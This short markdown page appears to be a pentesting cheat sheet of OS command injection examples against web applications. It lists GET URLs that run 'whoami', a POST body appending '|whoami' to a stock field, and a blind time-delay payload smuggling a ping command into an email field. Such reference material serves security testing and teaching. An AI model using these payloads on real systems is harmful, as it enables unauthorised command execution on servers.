---
title: Command Injection Examples
desc: Examples of OS Command Injection.
tags: [CommandInjection, Web]
alts: []
website:
render_with_liquid: false
---

## HTTP GET Request

```html
http://vulnerable.com/api/cmd/whoami
http://vulnerable.com/command/whoami
```

<br />

## HTTP POST Request

```html
POST /product/stock HTTP/1.1
...

productId=1&stockId=1|whoami
```

<br />

## HTTP POST Request (Blind Command Injection (time delay))

```html
POST /feedback/submit HTTP/1.1
...

name=michael&email=michael@example.com||ping+-c+10+127.0.0.1||&message=hello
```